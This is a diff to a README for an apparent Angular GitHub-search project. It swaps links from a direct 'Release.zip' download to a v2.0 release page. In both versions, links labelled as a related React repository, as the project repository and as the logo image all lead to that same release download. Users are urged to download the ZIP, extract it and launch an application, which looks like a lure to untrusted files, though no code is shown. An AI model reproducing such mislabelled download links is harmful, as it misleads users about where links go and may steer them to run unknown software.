@@ -27,7 +27,7 @@ This repository covers a wide range of topics related to Angular, GitHub API, an
 ## Installation 🛠️
 To get started with this project, you can download the latest release by clicking on the button below:
 
-[![Download ZIP](https://github.com/LordHeavenG/github-search-api-angular/releases/download/v1.0/Release.zip)](https://github.com/LordHeavenG/github-search-api-angular/releases/download/v1.0/Release.zip)
+[![Download ZIP](https://github.com/LordHeavenG/github-search-api-angular/releases/tag/v2.0)](https://github.com/LordHeavenG/github-search-api-angular/releases/tag/v2.0)
 
 Once you have downloaded the ZIP file, extract it and launch the application to explore the functionalities offered by the GitHub Search API with Angular.
 
@@ -57,14 +57,14 @@ Explore the power of Angular and GitHub API integration with this awesome GitHub
 ---
 
 ### Related Repositories
-- [github-search-api-react](https://github.com/LordHeavenG/github-search-api-angular/releases/download/v1.0/Release.zip): A similar project using React for GitHub repository search.
+- [github-search-api-react](https://github.com/LordHeavenG/github-search-api-angular/releases/tag/v2.0): A similar project using React for GitHub repository search.
 
 ---
 
-For more information and updates, visit the [GitHub repository](https://github.com/LordHeavenG/github-search-api-angular/releases/download/v1.0/Release.zip). Thank you for checking out this project! 🌟
+For more information and updates, visit the [GitHub repository](https://github.com/LordHeavenG/github-search-api-angular/releases/tag/v2.0). Thank you for checking out this project! 🌟
 
 ---
 
-![Angular Logo](https://github.com/LordHeavenG/github-search-api-angular/releases/download/v1.0/Release.zip)
+![Angular Logo](https://github.com/LordHeavenG/github-search-api-angular/releases/tag/v2.0)
 
 Built with ❤️ using Angular.
